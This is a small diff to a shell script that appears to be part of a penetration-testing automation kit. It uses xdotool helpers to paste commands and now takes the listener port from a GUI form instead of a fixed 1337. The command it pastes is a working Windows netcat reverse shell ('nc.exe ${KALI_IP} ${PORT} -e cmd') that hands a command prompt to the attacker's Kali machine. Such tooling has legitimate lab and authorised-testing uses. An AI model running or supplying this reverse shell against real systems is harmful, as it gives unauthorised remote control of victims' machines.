@@ -2,5 +2,11 @@
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-paste_command "nc.exe ${KALI_IP} 1337 -e cmd"
+# Generate gui form
+generate_form "port"
+
+PORT=${form_data["port"]}
+
+paste_command "nc.exe ${KALI_IP} ${PORT} -e cmd"
